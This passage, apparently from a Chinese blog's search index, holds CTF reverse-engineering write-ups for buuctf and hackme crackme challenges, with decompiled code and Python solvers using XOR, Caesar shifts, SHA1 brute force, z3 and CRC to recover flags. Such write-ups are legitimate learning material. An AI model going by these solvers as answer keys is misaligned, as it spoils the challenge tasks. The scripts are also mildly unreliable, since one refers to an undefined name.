Dest);\n}\n```\n\n结合以上分析给出以下脚本\n\n```python\noff_418000 = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"\n\noff_418004 = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\"\n\nflag=''\n\nfor i in range(len(off_418004)):\n    if i %2 == 0:\n        flag += off_418004[i]\n        continue\n    for j,k in enumerate(off_418000):\n        if off_418004[i] == k:\n            if chr(j+38).isupper():\n                flag += chr(j+38)\n            else:\n                flag += chr(j+96)\n\nprint (flag)\n```\n\n但得出的flag提交发现不正确，百度知道还需添加一个字符`E`才能通过。之后发现变换后的字符串末尾应该有结束符，所以输入的 flag 应该比变换后的字符串多一个字符，因为多出来的那个字符经过变换会变成结束符。","tags":["buuctf"]},{"title":"buuctf re 简单注册器","url":"/2019/11/02/注册器/","content":"\n又是一道Android题，，用`dex2jar`和`jd-gui`可直接获得MainActivity源码 (参考前一篇Android博客\n\n![KOSYxH.png](https://s2.ax1x.com/2019/11/02/KOSYxH.png)\n\n分析大致流程：给定字符串，一系列变换后，逆序输出即为flag\n\n```python\na = 'dd2940c04462b4dd7c450528835cca15'\na = list(a)\na[2] = chr(ord(a[2]) + ord(a[3]) - ord('2'))\na[4] = chr(ord(a[2]) + ord(a[5]) - ord('0'))\na[30] = chr(ord(a[31]) + ord(a[9]) - ord('0'))\na[14] = chr(ord(a[27]) + ord(a[28]) - ord('a'))\n\nprint('flag{'+''.join(a[::-1])+'}')\n```\n\n","tags":["buuctf"]},{"title":"buuctf re crackrtf","url":"/2019/11/02/crackrtf/","content":"\nida打开 F5\n\n![Kqitud.png](https://s2.ax1x.com/2019/11/02/Kqitud.png)\n\n程序分为两部分输入，第一次输入后，将输入的字符串通过`atoi()`转换成整型，之后`strcat()`函数与`@DBApp`连接代入`sub_40100A`函数，跟进此函数\n\n![KqFpxe.png](https://s2.ax1x.com/2019/11/02/KqFpxe.png)\n\n推测此函数为hash加密函数，通过对CryCreateHash函数的了解，查询其中一参数ALG_ID 0x8004，得到此函数为sha1算法\n\n![KqFmRS.png](https://s2.ax1x.com/2019/11/02/KqFmRS.png)\n\n可利用python的hashlib对第一段输入进行爆破求解，结果为 123321\n\n```python\nimport hashlib\nflag2 = '@DBApp'\nfor i in range(100000,999999):\n\th2 = hashlib.sha1(str(i)+flag2)\n\tflags = h2.hexdigest()\n\tif(\"6E32D0943418C2C33385BC35A1470250DD8923A9\".lower() == flags):\n\t\tprint(str(i))\n```\n\n将结果输入程序，通过验证，进入第二次输入\n\n将输入与之前12位字符连接，代入`sub_401019`，经查询此函数为MD5算法，由于没有足够的信息，对其爆破难度大，放弃此方法。发现下文还有一判断函数`sub_40100F`，跟进\n\n![KqFXLj.png](https://s2.ax1x.com/2019/11/02/KqFXLj.png)\n\nAPI函数`FindResourceA`查找文件中包含名为AAA的文件，通过`sub_401005`把AAA的文件中取出字符和输入的字符串进行异或得到一个.rtf文件，通过`ResourceHacker`这个软件查看包含文件AAA\n\n![KqkB6g.png](https://s2.ax1x.com/2019/11/02/KqkB6g.png)\n\n因为需要得到的只有前6/18位字符，所以可通过rtf文件头的格式对前6位字符进行还原\n\n随便创建一个rtf文件，用winhex打开，即可得到文件头前6位“{\\\\\\rtf1”，注意 \\ 还需要一个 \\ 进行转义\n\n![KqAMEn.png](https://s2.ax1x.com/2019/11/02/KqAMEn.png)\n\n```python\ns = [0x05,0x7D,0x41,0x15,0x26,0x01] \na = '{\\\\rtf1'\nflag = ''\nfor i in range(len(a)):\n    flag += chr(ord(a[i])^s[i])\nprint(flag)\n```\n\n得到前6位字符为`~!3a@0`，输入程序，程序运行结束即可在当前目录下生成dbapp.rtf文件，打开得到flag","tags":["buuctf"]},{"title":"buuoj findit 初探Android逆向","url":"/2019/10/25/buuoj findit 安卓逆向/","content":"\n这题给的是一个`apk文件`，刚接触安卓，简要学习了一下安卓逆向的大致流程\n\n**反编译代码**的工具下载：\n\n- dex2jar: 把`dex文件`转成`jar文件`下载地址：https://sourceforge.net/projects/dex2jar/files/\n- jd-gui: 这个工具用于将`jar文件`转换成`java代码`下载地址：http://jd.benow.ca/\n\n**反编译资源**的工具：\n\n- APKTool: APK逆向工具，使用简单下载地址: http://ibotpeaches.github.io/Apktool/install/\n- 简单介绍下大概流程，首先把后缀为`.apk`的文件改为`.zip`的一个压缩文件，方便解压。`dex2jar`和`jd-gui`配套使用，用于逆向代码部分，`APKTool`用于逆向res文件夹下的图片布局等部分。`.apk` 修改成.zip文件解压后的目录树长这样：\n\n![KdPb28.png](https://s2.ax1x.com/2019/10/25/KdPb28.png)\n\n### 反编译代码\n\n用到`dex2jar包`中三个文件`d2j_invoke.bat`, `d2j-dex2jar.bat`, `lib`，将上面解压的`classes.dex文件`和这三个文件一起复制到同一文件夹。\n\n在当前窗口运行`d2j-dex2jar.bat classes.dex`，即可得到`classes-dex2jar.jar`文件\n\n[![KdiUit.png](https://s2.ax1x.com/2019/10/25/KdiUit.png)](https://imgchr.com/i/KdiUit)\n\n再运行`jd-gui`，将`classes-dex2jar.jar`拖入，即可得到想要的 java 代码\n\n![Kdi7w9.png](https://s2.ax1x.com/2019/10/25/Kdi7w9.png)\n\n### 反编译res资源部分\n\napktool跟着官网的安装步骤即可完成安装\n\n在find.apk文件目录下cmd运行 `apktool find.apk`可得到同名文件夹\n\n这个文件夹下会得到若干文件，主要内容介绍如下：\n\n- AndroidManifest.xml：描述文件\n- res：资源文件\n- smail：反编译出来的所有代码，语法与java不同，类似汇编，是Android[虚拟机](https://www.52pojie.cn/thread-661779-1-1.html)所使用的寄存器语言\n\n![KdFJ6U.png](https://s2.ax1x.com/2019/10/25/KdFJ6U.png)\n\n查看`MainActivity.smali`文件，得到以下关键信息，结合`.line 22` 和`.line 23`可知两串字符串分别对应上面java代码中的`arrayOfChar1`和`arrayOfChar2`\n\n```smali\n    .line 22\n    :array_0\n    .array-data 2\n        0x54s\n        0x68s\n        0x69s\n        0x73s\n        0x49s\n        0x73s\n        0x54s\n        0x68s\n        0x65s\n        0x46s\n        0x6cs\n        0x61s\n        0x67s\n        0x48s\n        0x6fs\n        0x6ds\n        0x65s\n    .end array-data\n\n    .line 23\n    nop\n\n    :array_1\n    .array-data 2\n        0x70s\n        0x76s\n        0x6bs\n        0x71s\n        0x7bs\n        0x6ds\n        0x31s\n        0x36s\n        0x34s\n        0x36s\n        0x37s\n        0x35s\n        0x32s\n        0x36s\n        0x32s\n        0x30s\n        0x33s\n        0x33s\n        0x6cs\n        0x34s\n        0x6ds\n        0x34s\n        0x39s\n        0x6cs\n        0x6es\n        0x70s\n        0x37s\n        0x70s\n        0x39s\n        0x6ds\n        0x6es\n        0x6bs\n        0x32s\n        0x38s\n        0x6bs\n        0x37s\n        0x35s\n        0x7ds\n    .end array-data\n```\n\n分析java代码，判断对`arrayOfChar2`中字母进行凯撒加密，爆破脚本如下\n\n```python\nmodel = \"abcdefghijklmnopqrstuvwxyz\"\n\nstr1 = \"pvkq{m164675262033l4m49lnp7p9mnk28k75}\"\n\nfor i in range(1,27):\n    for s in str1:\n        if s.isalpha():\n            n = model.find(s)\n            s = model[n-i]\n        print(s, end='')\n    print('\\n')\n```\n\n![KdkfrF.png](https://s2.ax1x.com/2019/10/25/KdkfrF.png)\n\n","tags":["buuctf"]},{"title":"hackme_re部分wp","url":"/2019/10/06/hackme-re/","content":"\n### helloworld\n\n```c\n  v4 = 3363956977;\n  v5 = 3469705682;\n  v6 = 2176877013;\n  v7 = 3369451731;\n  v8 = 3451965390;\n  v9 = 3436498817;\n  v10 = 2413020355;\n  v11 = 0;\n  printf(\"What is magic number? \");\n  __isoc99_scanf(\"%d\", &v12);\n  if ( v12 == 314159265 )\n  {\n    for ( i = 0; *((_BYTE *)&v4 + i); ++i )\n      *((_BYTE *)&v4 + i) ^= v12;\n    printf(\"Flag is FLAG{%s}\\n\", &v4);\n  }\n  else\n  {\n    puts(\"Try Hard.\");\n  }\n  return 0;\n}\n```\n\n\n\n### simple\n\n```python\na = 'UIJT.JT.ZPVS.GMBH'\nh=''\nfor i in a:\n    h += chr(ord(i)-1)\nprint(h)\n```\n\n### passthis\n\n![uckWad.png](https://s2.ax1x.com/2019/10/06/uckWad.png)\n\n```python\na=[0xC1,0xCB,0xC6,0xC0,0xFC,0xC9,0xE8,0xAB,0xA7,0xDE,0xE8,0xF2,0xA7,0xF4,0xEF,0xE8,0xF2,0xEB,0xE3,0xA7,0xE9,0xE8,0xF3,0xA7,0xF7,0xE6,0xF4,0xF4,0xA7,0xF3,0xEF,0xE2,0xA7,0xE1,0xEB,0xE6,0xE0,0xFA]\ns=''\nfor i in a:\n    s += chr(i^135)\nprint(s)\n```\n\n\n\n### pyyy\n\n`uncompyle6 pyyy.pyc > pyyy.py`可直接将pyc文件反编译出py源码，打开\n\n```python\n# uncompyle6 version 3.4.0\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 2.7.16 (v2.7.16:413a49145e, Mar  4 2019, 01:37:19) [MSC v.1500 64 bit (AMD64)]\n# Embedded file name: pyyy.py\n# Compiled at: 2016-06-12 01:14:31\n__import__('sys').setrecursionlimit(1048576)\ndata = 'Tt1PJbKTTP+nCqHvVwojv9K8AmPWx1q1UCC7yAxMRIpddAlH+oIHgTET7KHS1SIZshfo2DOu8dUt6wORBvNVBpUSsuHa0S78KG+SCQtB2lr4c1RPbMf0nR9SeSm1ptEY37y310SJMY28u6m4Y44qniGTi39ToHRTyxwsbHVuEjf480eeYAfSVvpWvS8Oy2bjvy0QMVEMSkyJ9p1QlGgyg3mUnNCpSb96VgCaUe4aFu4YbOnOV3HUgYcgXs7IcCELyUeUci7mN8HSvNc93sST6mKl5SDryngxuURkmqLB3azioL6MLWZTg69j6dflQIhr8RvOLNwRURYRKa1g7CKkmhN4RytXn4nyK2UM/SoR+ntja1scBJTUo0I31x1wBJpT4HjDN47FLQWIkRW+2wnB3eEwO5+uSiQpzA8VaH7VGRrlU/BFW4GqbaepzKPLdXQFBkNyBKzqzR/zA2GIrYbLIVScWJ19DqJCOyVLGeVIVXyzN1y327orYL2Ee3lRITnE3FouicRStaznIcw8xmxvukwVMRZIJ/vTu8Zc1WQIYEIFXMHozGuvzZgROZTyFihWNRCBBtoP9DJJALJb0pA1IKIb2zLh+pwGF40Y6y93D6weKejGPO+A0DBXH9vuLcCcCIvr/XPQhO3jLKCBN+h9unuJKW3dyWxyaVPdR2V+BTw10VXolo7yaTH1GbR4TiVSB308mBOMwfchwihEe7RdMXvmXgaGarKkJe0NLUCd8jwhYII+WymjxO/xOz/ppOvNfAyIQksW0sggRPQTlgXSZ7MIVA1h66sGNljJ833MoFzWof3azLabaz1OrAJFqYXBg/myDsy1tV6rULSQ82hVR/TNnSmBGvyEDJTrLSwHyj78NOrW4mUnlLGBnAgWfw6pW2lRK2jkNX9NM6DfLsRK8lwl85UP8CZSuNdcLmLwHTVMZGm/cNkZCtWRBlZqEggxGdIO44D+f4y6ysnAk5/QzEwjIuecxEOb0jyV6dFui8g0c3Oxlhzcli0X8ToJFyeQRv1N9nokYZ07tFlG6m18kCToKz1qiH1U7kljXa6SvdORur5dWYLQ//gwhwppe7JlNda/cEoh92h96wRZDv1dSK/f1vz+mUeUyUlFY0iMjfw5eBXWZppNZi3ZtJcq5kllM2ACVFcxQWI3azM3ArOcqjosoiPjNoDYgKh7w4k2Cd0kLYEHscz/njtJ1KEcwLtqs4nJ+gB2r4V9g03YgvY5E8JJtfJMKdaTedjtvEuif8FNlCK9DMnL1iLpWptJbdfO83Y7Y46XCqjZFBI5o9Qtb78nLhMEM5/YTaNOM/wE/oJl5HI/i1X6kW3PKCsVubRkOkc2xawl6NYdLETjLvmrGhhI'\na = 138429774382724799266162638867586769792748493609302140496533867008095173455879947894779596310639574974753192434052788523153034589364467968354251594963074151184337695885797721664543377136576728391441971163150867881230659356864392306243566560400813331657921013491282868612767612765572674016169587707802180184907L\nb = 166973306488837616386657525560867472072892600582336170876582087259745204609621953127155704341986656998388476384268944991674622137321564169015892277394676111821625785660520124854949115848029992901570017003426516060587542151508457828993393269285811192061921777841414081024007246548176106270807755753959299347499L\nc = 139406975904616010993781070968929386959137770161716276206009304788138064464003872600873092175794194742278065731836036319691820923110824297438873852431436552084682500678960815829913952504299121961851611486307770895268480972697776808108762998982519628673363727353417882436601914441385329576073198101416778820619L\nd = 120247815040203971878156401336064195859617475109255488973983177090503841094270099798091750950310387020985631462241773194856928204176366565203099326711551950860726971729471331094591029476222036323301387584932169743858328653144427714133805588252752063520123349229781762269259290641902996030408389845608487018053L\ne = 104267926052681232399022097693567945566792104266393042997592419084595590842792587289837162127972340402399483206179123720857893336658554734721858861632513815134558092263747423069663471743032485002524258053046479965386191422139115548526476836214275044776929064607168983831792995196973781849976905066967868513707L\nF = (a, b, c, d, e)\nm = 8804961678093749244362737710317041066205860704668932527558424153061050650933657852195829452594083176433024286784373401822915616916582813941258471733233011L\ng = 67051725181167609293818569777421162357707866659797065037224862389521658445401L\nz = []\nfor i, f in enumerate(F):\n    n = pow(f, m, g)\n    this_is = 'Y-Combinator'\n    l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda x: 1 if x < 2 else f(x - 1) * x % n)(g % 27777)\n    c = raw_input('Channenge #%d:' % i)\n    if int(c) != l:\n        print 'Wrong~'\n        exit()\n    z.append(l)\nz.sort()\ngg = '(flaSg\\'7 \\\\h#GiQwt~66\\x0csxCN]4sT{? Zx YCf6S>|~`\\x0c$/}\\'\\r:4DjJFvm]([sP%FMY\"@=YS;CQ7T#zx42#$S_j0\\\\Lu^N31=r\\x0b\\t\\tjVhhb_KM$|6]\\nl!:V\\rx8P[0m ;ho_\\rR(0/~9HgE8!ec*AsGd[e|2&h!}GLGt\\'=$\\x0cbKFMnbez-q\\\\`I~];@$y#bj9K0xmI2#8 sl^gBNL@fUL\\x0b\\\\9Ohf]c>Vj/>rnWXgLP#<+4$BG@,\\'n a_7C:-}f(WO8Y\\x0c2|(nTP!\\'\\\\>^\\'}-7+AwBV!w7KUq4Qpg\\tf.}Z7_!m+ypy=`3#\\\\=?9B4=?^}&\\'~ Z@OH8\\n0=6\\x0b\\tv\\nl!G\\'y4dQW5!~g~I*f\"rz1{qQH{G9\\x0c\\'b\\x0cp\\x0bdu!2/\\\\@i4eG\"If0A{-)N=6GMC<U5/ds\\rG&z>P1\\nsq=5>dFZUWtjv\\tX~^?9?Irwx\\\\5A!32N\\x0bcVkx!f)sVY Men\\x0c\\'ujN<\"LJ\\x0c5R4\"\\\\\\\\XPVA\\'m$~tj)Br}C}&kX2<|\\np3XtaHB.P\\'(E 4$dm!uDyC%u [\"x[VYw=1aDJ (8V/a!J?`_r:n7J88!a25AZ]#,ab?{%e\\x0b]wN_}*Q:mh>@]u\\t&6:Z*Fmr?U`cOHbAf7s@&5~L ,\\tQ18 -Hg q2nz%\\x0ccUm=dz&h1(ozoZ)mrA=`HKo\\n\\'rXm}Z-l3]WgN\\\\NW<{o=)[V({7<N1.-A8S\"=;3sderb\\tOZ$K\\r0o/5\\x0bMc76EGCWJ3IQpr7!QhbgzX8uGe3<w-g\\'/j\\'\\tM4|9l?i&tm_\\n57X0B2rOpuB@H@%L_\\r)&/q=LZa(%}\"\"#if#Kq74xK?`jGFOn\"8&^3Q-\\r#]E$=!b^In0:$4VKPXP0UK=IK)Y\\rstOT40=?DyHor8j7O\\\\r/~ncJ5];cCT)c?OS0EM5m#V(-%\"Tu:!UsE],0Dp  s@HErS]J{%oH54B&(zE.(@5#2k\\tJnNlnUEij\\\\.q/3HBpJNk*X(k5;DlqK\\'\\'fX\\r}EBk_7\\x0b:>8~\\t+M@WJx.PO({/U}1}#TqjreG\\nN{\\rX>4EsJr0Pn\\\\Z\\\\aL/-U<<{,Q;j\\tF=7f\\')+wH:p{G=_.s\\\\t-\\x0bI\\x0c*y\\t1P:Y|/2xE<uo]~$>5k]FW+>fR<QA\"(Fj[LL(hzfQo#PJ;:*0kB~3]9uL[o.xue:VQ\\t;9-Tu\\tq|mzzhV_okP\\t,d\\rQ`]5Gf\\x0c#gXB\\x0cAH|)NI|K=KW-&p-<b\"3e.rO\\x0cuK=\\x0c^\\r+MuLxCJ`UKaD\\x0bBH&n+YVajZ(U7pwWtto3T10VLHwSJ\\rK\\t}\\'F$l1:b2Bd\\na=#t0iq}#!{1_)w$}<Dp(borC\\'\\t?r6;,+k;a(Q3@B?RCWYEDrjZe![x=n_%S]rl{&fLr*mgCD;92/nNsaxKy/;\\nr]sPK=`+YP>MmfB\\n8O4/\"}nE7r*=41f2\\t37>K\\'s$wpl;qS[`qzu\\x0b\\t\\nuaU|b,C`4& dRN~]7DnuTb2FhNHV!#Z2Hho\\x0b[%.{O\\t$q0\\x0ch_@?w@b8[I^{JL|O8]i8{p)A.w)14qK3JoyF%licZ~ga\\rW[L:W\\rtIvfWJjZUOvB\\rS.Beav3!-@bw|PexJ Pcw1\\ry6!63B}]J])6fak/3r]W\\tMeXt[uc(1_U lys{a1X\\r%)[wwP3rhgNW{*d~_E%Q2htCt5ha@l0^0=\\x0bwT\\ni4/V;_\\nM1rb?w~Q)Dli4u\\n`}1+D8\"\\t`@V~$9l$Uy**VnI (@Ga0<RxfmoNgJTtE-aLH\\rE5fMy7rk$)V\\rL2Fv/AivOa\"\\nuX|70Xrw^D]%i%JyT\\x0cc%cwZ/Wbp=IiY;/@nFEe>3=tM;K*`fReGoc5V/Ri?nXZ-RW)\\'\\t<\\x0cV>@X@-Ei4%sO%},B_pjc`s\"@oKCmdgDhjUZT@?mb\\'?Q:F\\x0bLJkPgjaFAc=rbrjAz$Zz\\x0cq0GU!\")xFOEF(x!3M\\t:l83|}}HgGJJ#eT/I\\x0b[|lK_n+;Wi/N^B4LzL.a(gVWq,zO6\\'S|tb>RX` ca*CO<w\\x0ci =wc1,M~\\x0bc`FYEs\\r){+Ll8[I9-88m\\t\\\\iK/\\\\hno-C[vX*3Hx:%:K\\rt\\x0cW!tj\\'SOhqxP|k7cw Hm?I@?P\\'HmapG7$0#T(Auz]sjmd#\\rFP/}53@-Kvmi(d%dZKLZ2LK\\'e_E\\x0bQmR 5/(irq4-EUyp<hB?[\\tnU:p*xuzASM'\nprint ('').join(gg[(lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda n: 1 if n < 3 else f(n - 1) + f(n - 2))(i + 2)] for i in range(16)) % ('').join(data[pow((__import__('fractions').gcd(z[(i % 5)], z[((i + 1) % 5)]) * 2 + 1) * g, F[(i % 5)] * (i * 2 + 1), len(data))] for i in range(32))\n# okay decompiling pyyy.pyc\n\n```\n\n分析代码，要求用户输入`c`，若`c != l`则输出wrong，其中`l`由分析可知是由程序自动生成与用户输入无关。将py文件`c = raw_input('Channenge #%d:' % i)`前添加`print l`,载入kali中运行。将得到的`l`用作输入`c`的值，得到flag。\n\n![uck7M8.png](https://s2.ax1x.com/2019/10/06/uck7M8.png)\n\n\n\n### accumulator\n\n![uckOaj.png](https://s2.ax1x.com/2019/10/06/uckOaj.png)\n\n定位到关键部分代码，但暂时不太清楚`SHA512()`函数中的参数是什么。拖入edb动态分析，在SHA512下断点，从寄存器参数可知，SHA512带入的函数参数为`输入的字符串`和其`长度`，并将加密后的结果存在&v6开始的地址下。\n\n进入`4008C0()`函数\n\n![uckXIs.png](https://s2.ax1x.com/2019/10/06/uckXIs.png)\n\n分析可知，此函数的作用是：将传入的字符串按字节进行累加，每加一次就与`dic`比较，若不相等则输出`Bad flag :(`并退出。所以依次相减可得出flag\n\n```python\ndic = [0x00c3, 0x00ff, 0x01ed, 0x0248, 0x031f, 0x03a1, 0x03b2, 0x043e, 0x049c, 0x04a0, 0x058d, 0x063b, 0x070d, 0x0736, 0x0821, 0x0910, 0x097e, 0x0a2d, 0x0aa7, 0x0b9c, 0x0c8d, 0x0d4b, 0x0d5a, 0x0e41, 0x0e80, 0x0f6e, 0x0f95, 0x1061, 0x1084, 0x112a, 0x11ab, 0x1210, 0x1262, 0x1347, 0x1387, 0x13d0, 0x13f2, 0x14ab, 0x1586, 0x15a0, 0x160c, 0x1677, 0x1769, 0x17e6, 0x17ee, 0x1836, 0x1843, 0x190a, 0x1945, 0x19d1, 0x19f7, 0x1a60, 0x1b42, 0x1b62, 0x1b8d, 0x1bc2, 0x1c6a, 0x1d2c, 0x1d8b, 0x1df9, 0x1e1a, 0x1f14, 0x1fd2, 0x1ffb, 0x2041, 0x208d, 0x20ce, 0x2115, 0x2190, 0x21c0, 0x21f5, 0x2226, 0x2259, 0x228c, 0x22c5, 0x22f9, 0x232f, 0x2366, 0x2399, 0x23c9, 0x23ff, 0x2465, 0x249e, 0x24d5, 0x250b, 0x2544, 0x2577, 0x25ac, 0x25dc, 0x260d, 0x2640, 0x2676, 0x26d8, 0x270c, 0x273d, 0x27a0, 0x27d3, 0x2806, 0x2836, 0x286e, 0x28a2, 0x28d2, 0x2937, 0x299c, 0x29fe, 0x2a61, 0x2ac2, 0x2b25, 0x2b58, 0x2b8b, 0x2bc2, 0x2c28, 0x2c59, 0x2cbb, 0x2cf3, 0x2d55, 0x2d85, 0x2de9, 0x2e4c, 0x2e7c, 0x2eaf, 0x2f14, 0x2f49, 0x2f81, 0x2fe3, 0x3048, 0x3079, 0x30ad, 0x3113, 0x3178, 0x31ae, 0x31e7, 0x3217, 0x3279, 0x32aa, 0x32dc, 0x330f, 0x3375, 0x33ab, 0x33dc, 0x343e, 0x346e, 0x34d1, 0x3501, 0x3563, 0x3596, 0x35cb, 0x3631, 0x3694, 0x36cd, 0x3700, 0x3763, 0x37c6, 0x3829, 0x3860, 0x3892, 0x38c3, 0x38f3, 0x3923, 0x3957, 0x398c, 0x39c5, 0x39f8, 0x3a2e, 0x3a67, 0x3acc, 0x3b32, 0x3b6a, 0x3b9f, 0x3bd2, 0x3c03, 0x3c64, 0x3c95, 0x3cfa, 0x3d32, 0x3d93, 0x3dca, 0x3e2c, 0x3e60, 0x3e92, 0x3ecb, 0x3f04, 0x3f69, 0x3fa0, 0x4002, 0x403b, 0x409f, 0x40d8, 0x410f, 0x413f, 0x41a1, 0x41da, 0x423b, 0x426d, 0x42a0, 0x4301, 0x4362, 0x43df]\nflag = \"\"\nfor i in range(1,len(dict)):\n    flag += chr(dic[i] - dic[i-1])\nprint(flag)\n```\n\n\n\n### GCCC\n\n.NET文件，用`dnSpy`打开反汇编得到java源码\n\n```java\nusing System;\n\n// Token: 0x02000002 RID: 2\npublic class GrayCCC\n{\n\t// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458\n\tpublic static void Main()\n\t{\n\t\tConsole.Write(\"Input the key: \");\n\t\tuint num;\n\t\tif (!uint.TryParse(Console.ReadLine().Trim(), out num))\n\t\t{\n\t\t\tConsole.WriteLine(\"Invalid key\");\n\t\t\treturn;\n\t\t}\n\t\tstring text = \"\";\n\t\tstring text2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ{} \";\n\t\tint num2 = 0;\n\t\tbyte[] array = new byte[]\n\t\t{\n\t\t\t164,\n\t\t\t25,\n\t\t\t4,\n\t\t\t130,\n\t\t\t126,\n\t\t\t158,\n\t\t\t91,\n\t\t\t199,\n\t\t\t173,\n\t\t\t252,\n\t\t\t239,\n\t\t\t143,\n\t\t\t150,\n\t\t\t251,\n\t\t\t126,\n\t\t\t39,\n\t\t\t104,\n\t\t\t104,\n\t\t\t146,\n\t\t\t208,\n\t\t\t249,\n\t\t\t9,\n\t\t\t219,\n\t\t\t208,\n\t\t\t101,\n\t\t\t182,\n\t\t\t62,\n\t\t\t92,\n\t\t\t6,\n\t\t\t27,\n\t\t\t5,\n\t\t\t46\n\t\t};\n\t\tbyte b = 0;\n\t\twhile (num != 0u)\n\t\t{\n\t\t\tchar c = (char)(array[num2] ^ (byte)num ^ b);\n\t\t\tif (!text2.Contains(new string(c, 1)))\n\t\t\t{\n\t\t\t\tConsole.WriteLine(\"Invalid key\");\n\t\t\t\treturn;\n\t\t\t}\n\t\t\ttext += c;\n\t\t\tb ^= array[num2++];\n\t\t\tnum >>= 1;\n\t\t}\n\t\tif (text.Substring(0, 5) != \"FLAG{\" || text.Substring(31, 1) != \"}\")\n\t\t{\n\t\t\tConsole.WriteLine(\"Invalid key\");\n\t\t\treturn;\n\t\t}\n\t\tConsole.WriteLine(\"Your flag is: \" + text);\n\t}\n}\n```\n\n关键代码`char c = (char)(array[num2] ^ (byte)num ^ b);`，使用python的z3模块可快速解方程\n\n```python\nfrom z3 import *\narray = [164,25,4,130,126,158,91,199,173,252,239,143,150,251,126,39,104,104,146,208,249,9,219,208,101,182,62,92,6,27,5,46]\nx = BitVec('x',64)\nsolver = Solver()\nsolver.add(x >= 2**31)\nsolver.add(x <= 2**32)\nb = 0\nflag = ''\nfor num in range(32):\n    if num < 5:\n        solver.add( (array[num]^(x&0x7f)^b)&0x7f == ord('FLAG{'[num]))\n    elif num < 31:\n        solver.add(\n            Or(\n                And(\n                    (array[num]^(x&0x7f)^b)&0x7f <= ord('Z'),\n                    (array[num]^(x&0x7f)^b)&0x7f >= ord('A')\n                    ),\n                (array[num]^(x&0x7f)^b)&0x7f == ord(' ')\n                )\n            )\n    if num == 31:\n        solver.add((array[num]^(x&0x7f)^b)&0x7f == ord('}'))\n    b = (b^array[num]) & 0x7f\n    x >>= 1\n\nif(solver.check() == sat):\n    print solver.model()\n```\n\n得到[x = 3658134498]\n\n程序一闪而过，od打不开程序，只好自己模拟一遍过程\n\n```python\narray = [164,25,4,130,126,158,91,199,173,252,239,143,150,251,126,39,104,104,146,208,249,9,219,208,101,182,62,92,6,27,5,46]\nx = 3658134498\nflag = ''\nb = 0\nfor num in range(32):\n    c = chr((array[num] ^ (x&0x7f) ^ b)&0x7f)\n    flag += c\n    b = (b^array[num])&0x7f\n    x >>= 1\n\nprint(flag)\n```\n\n\n\n### ccc\n\n![uckxGq.png](https://s2.ax1x.com/2019/10/06/uckxGq.png)\n\n\n\n![ucAPLF.png](https://s2.ax1x.com/2019/10/06/ucAPLF.png)\n\n取flag每三位递增，进行CRC校验取得CRC32值与hashes比较，可模拟CRC算法，暴力解出。\n\n![ucAeRx.png](https://s2.ax1x.com/2019/10/06/ucAeRx.png)\n\nCRC校验码生成步骤如下\n\n> crc校验，具体步骤如下：\n>\n> （1）将上次计算出的CRC校验码右移一个字节(i >>= 8)；\n> （2）将移出的这个字节与新的要校验的字节进行XOR 运算；(i ^ flag[i])\n> （3）用运算出的值在预先生成码表中进行索引，获取对应的值（称为余式）；j = crc32_tab[i ^ flag[i]]\n> （4）用获取的值与第（1）步右移后的值进行XOR 运算；i^j\n> （5）如果要校验的数据已经处理完，则第（4）步的结果就是最终的CRC校验码。如果还有数据要进行处理，则再转到第（1）步运行。\n\n```python\nimport string\n\ncrc32_tab = [0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, 0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, 0xfed41b76, 